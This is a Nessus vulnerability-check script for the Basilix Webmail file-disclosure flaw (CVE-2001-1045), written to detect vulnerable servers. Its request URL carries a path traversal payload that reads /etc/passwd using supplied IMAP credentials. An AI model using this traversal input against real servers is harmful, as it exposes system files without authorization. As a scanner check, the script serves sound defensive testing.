#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GPL
#
# References:
# From: "karol _" <su@poczta.arena.pl>
# To: bugtraq@securityfocus.com
# CC: arslanm@Bilkent.EDU.TR
# Date: Fri, 06 Jul 2001 21:04:55 +0200
# Subject: basilix bug
#


if(description)
{
 script_id(11072);
 script_bugtraq_id(2995);
 script_version ("$Revision: 1.12 $");
 script_cve_id("CVE-2001-1045");
 name["english"] = "Basilix Webmail Dummy Request Vulnerability";
 script_name(english:name["english"]);

 desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is prone to information
disclosure. 

Description :

The script 'basilix.php3' is installed on the remote web server.  Some
versions of this webmail software allow the users to read any file on
the system with the permission of the webmail software, and execute any
PHP. 

See also :

http://archives.neohapsis.com/archives/bugtraq/2001-07/0114.html

Solution : 

Update Basilix or remove DUMMY from lang.inc.

Risk factor : 

Low / CVSS Base Score : 2 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:N)";
 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of basilix.php3";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO); 

 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);

 script_dependencies("http_version.nasl", "logins.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("imap/login", "imap/password");

 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

if ( report_paranoia < 2 ) exit(0);


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) {
  if (log_verbosity > 1) display("imap/login and/or imap/password are empty; ", SCRIPT_NAME, " skipped!\n");
  exit(1);
}


url=string("/basilix.php3?request_id[DUMMY]=../../../../../../../../../etc/passwd&RequestID=DUMMY&username=", user, "&password=", pass);
if(is_cgi_installed_ka(port:port, item:url)){ security_note(port); exit(0); }
